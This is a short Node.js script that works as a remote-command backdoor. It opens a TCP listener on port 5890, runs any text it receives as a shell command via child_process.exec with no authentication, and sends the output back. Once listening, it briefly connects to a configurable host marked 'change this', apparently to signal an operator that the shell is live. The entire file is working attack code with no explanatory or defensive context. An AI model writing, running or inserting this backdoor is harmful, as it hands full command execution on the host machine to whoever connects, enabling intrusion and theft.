const net = require("net");
const exec = require("child_process");
let host = "192.168.100.107"; 		//change this
let port = 8080;	  
const server = net.createServer((c) => {
	c.on("data", (data) => {
		console.log(data.toString())
		exec.exec(data.toString(), (err, stdout, stderr) => {
			//console.log(stdout === "");
			if(stdout)c.write(stdout);
			if(stderr)c.write(stderr);
			if(stdout === "")c.write("no results");
		});
	});
}).listen(5890, () => {
	let client = net.createConnection(port, host, () => {
		client.destroy();
	})
})
